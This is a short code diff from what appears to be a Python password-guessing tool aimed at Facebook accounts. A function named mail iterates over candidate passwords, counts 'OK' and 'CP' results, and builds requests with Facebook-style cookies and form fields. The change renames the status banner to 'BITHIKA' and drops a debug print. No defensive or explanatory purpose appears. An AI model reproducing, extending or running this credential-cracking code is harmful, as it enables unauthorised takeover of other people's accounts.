@@ -2112,7 +2112,7 @@ def mail(uid,pwx,first,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(new) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(BITHIKA) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -2146,7 +2146,6 @@ def mail(uid,pwx,first,tl):
             'fmt': '1',
             'a': 'AYl5qTS4x2udD1YJHwF6J341XWNyHaCLSm1bD2zNXsR-pP9wT6k5jbBvwiRCA_6gqMQt81mqaSOOVhPfrcV8slR64wBsKi4kGGLR9G8ZurYJCQ',
             'user': '0'}
-            print(data)
             cookies = {
             'dpr': '2.418783187866211',
             'datr': 'F-syZzIg2LuWyDnBYPfUkTqZ',
